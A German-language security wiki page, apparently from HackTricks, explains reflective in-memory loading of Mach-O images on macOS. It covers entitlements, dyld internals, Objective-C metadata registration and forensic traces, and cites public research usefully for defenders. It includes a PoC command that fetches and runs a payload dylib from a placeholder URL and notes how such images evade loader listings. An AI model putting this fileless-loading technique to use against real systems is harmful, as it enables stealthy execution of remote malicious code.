# Reflective Mach-O Loading unter macOS

{{#include ../../../banners/hacktricks-training.md}}

Ein Reflective Loader mappt ein Mach-O-Image aus Bytes, die sich bereits in seinem eigenen Prozess befinden, verknüpft es anschließend und führt dessen Initialisierer aus, ohne den System-Loader zum Öffnen einer Payload-Datei aufzufordern. Dies ist **Codeausführung innerhalb des Prozesses**, kein Privilege Escalation- oder Remote-Process-Injection-Primitive.<sup>[[2]](#references)</sup>

Unter aktuellen macOS-Versionen schreibt der alte Pfad `NSCreateObjectFileImageFromMemory`/`NSLinkModule` das Image auf die Festplatte. ReflectiveLoader bettet stattdessen älteren Apple-dyld-Ladecode ein; Wardle demonstrierte dies unter macOS 15 und 26.<sup>[[2]](#references)[[3]](#references)</sup>

Wenn der Loader die Hardened Runtime verwendet, benötigt sein unsignierter In-Memory-Code eine Ausnahme für ausführbaren Speicher, etwa `com.apple.security.cs.allow-unsigned-executable-memory` oder `com.apple.security.cs.disable-executable-page-protection`; andernfalls wird die Ausführung durch die Code-Signing-Durchsetzung blockiert. Dies ist eine Signieranforderung für den Loader und kein Elevation-Primitive. Siehe die [macOS-Entitlements-Referenz](../macos-security-protections/macos-dangerous-entitlements.md#comapplesecuritycsallow-unsigned-executable-memory).<sup>[[2]](#references)</sup>

Für den PoC muss eine URL angegeben werden, die ein rohes Mach-O **Bundle, Framework oder dylib** bereitstellt. Die Datei `main.mm` weist leere Downloads zurück und gibt an, dass Payloads mit `LC_DYLD_CHAINED_FIXUPS` nicht unterstützt werden. Es wird auch ein lokaler Pfad akzeptiert, doch bei dieser Eingabe handelt es sich nicht um einen fileless Workflow. Bei Verwendung einer URL liest der Loader die Bytes in `NSData` ein und übergibt deren Buffer und Länge an `custom_dlopen_from_memory`.<sup>[[4]](#references)</sup>

```bash
./PoC 'https://example.invalid/payload.dylib'
```

Der eingebettete Loader ruft `ImageLoaderMachO::instantiateFromMemory` und anschließend `image->link` auf. Er registriert Objective-C-Metadaten **nach dem Linking, aber vor** `image->runInitializers`, das die Konstruktoren ausführt.<sup>[[5]](#references)</sup> Ohne Registrierung kann ein Konstruktor, der eine Objective-C-Nachricht sendet, mit `unrecognized selector sent to instance` fehlschlagen.<sup>[[3]](#references)</sup> Siehe den [normalen Ablauf des Image-Loadings in dyld](macos-library-injection/macos-dyld-process.md#flow) und die [Referenz zu Mach-O-Sections](../macos-files-folders-and-binaries/universal-binaries-and-mach-o-format.md#objective-c-common-sections).

## Objective-C-Metadaten aktivieren

Anders als beim normalen dyld-Loading macht das Einbetten des älteren Image-Loaders die Objective-C-Metadaten des Payloads nicht automatisch für `libobjc` nutzbar.<sup>[[3]](#references)</sup> Der angepasste LLVM-JIT-Ansatz durchsucht die gemappten Objective-C-Sections `__DATA` und `__DATA_CONST` und führt dann vor dem Ausführen der Konstruktoren die folgenden Schritte aus:<sup>[[1]](#references)[[5]](#references)[[6]](#references)</sup>

1. Durchlaufe `__objc_selrefs` in Schritten von `sizeof(SEL)`. Ermittle den Namen jedes nicht-null Selektors mit `sel_getName`, übergib ihn an `sel_registerName` und ersetze den Zeiger in der Section durch den kanonischen `SEL`.
2. Sammle die Klassen aus `__objc_classlist` und registriere sie mit `objc_readClassPair`; löse dabei zuerst die Abhängigkeiten von Oberklassen auf.
3. Schreibe Referenzen in `__objc_classrefs` und `__objc_superrefs` so um, dass sie auf registrierte Klassen oder Metaklassen verweisen, und füge Methoden aus Kategorien aus `__objc_catlist` hinzu.

Die Selector-Korrektur in `ObjCRuntime.cpp` entspricht beispielsweise Folgendem:<sup>[[6]](#references)</sup>

```objectivec
for (uint8_t *cursor = sectionStart;
     cursor < sectionStart + selRefsSectionSize;
     cursor += sizeof(SEL)) {
    SEL *selector = (SEL *)cursor;
    if (*selector == NULL) continue;
    *selector = sel_registerName(sel_getName(*selector));
}
```

Der PoC stützt sich auf internes Verhalten der Objective-C-Runtime und unterstützt nicht alle Funktionen des Mach-O-Formats. Sein Registrierungscode dient daher als Implementierungsreferenz und nicht als universell einsetzbarer Loader.<sup>[[1]](#references)[[4]](#references)[[6]](#references)</sup> Die Registrierung ist sowohl für referenzierte Apple-Klassen und -Methoden als auch für im Payload definierte Klassen erforderlich.<sup>[[3]](#references)</sup>

Ein reflektiv geladenes Image erscheint in den Tests des Autors nicht in `dyld_all_image_infos`. Seine anonymen ausführbaren Speicherzuordnungen können stattdessen in `vmmap` als unbenannte `dylib`-Bereiche erscheinen; erfasste Stackframes können als `<unknown binary>` angezeigt werden. Dies sind Hinweise für die Untersuchung, aber kein verlässlicher Beleg für eine Zuordnung zu diesem Loader. Der Zugriff auf Task-Informationen eines anderen Prozesses ist durch Entitlements eingeschränkt. Siehe [macOS memory dumping](../macos-files-folders-and-binaries/macos-memory-dumping.md) zu Einschränkungen beim Prozesszugriff.<sup>[[3]](#references)</sup>

## References

- [1] [LLVM JIT, Objective-C und Swift auf macOS: Wissenssammlung](https://stanislaw.github.io/2018-09-03-llvm-jit-objc-and-swift-knowledge-dump.html)
- [2] [Reflective Code Loading auf macOS wiederherstellen (Teil I)](https://objective-see.org/blog/blog_0x7C.html)
- [3] [Reflective Code Loading auf macOS wiederherstellen (Teil II)](https://objective-see.org/blog/blog_0x82.html)
- [4] [ReflectiveLoader-PoC main.mm](https://github.com/pwardle/ReflectiveLoader/blob/main/PoC/PoC/main.mm)
- [5] [ReflectiveLoader custom_dlfcn.cpp](https://github.com/pwardle/ReflectiveLoader/blob/main/loader/src/custom_dlfcn.cpp)
- [6] [ReflectiveLoader ObjCRuntime.cpp](https://github.com/pwardle/ReflectiveLoader/blob/main/loader/src/ObjCRuntime.cpp)
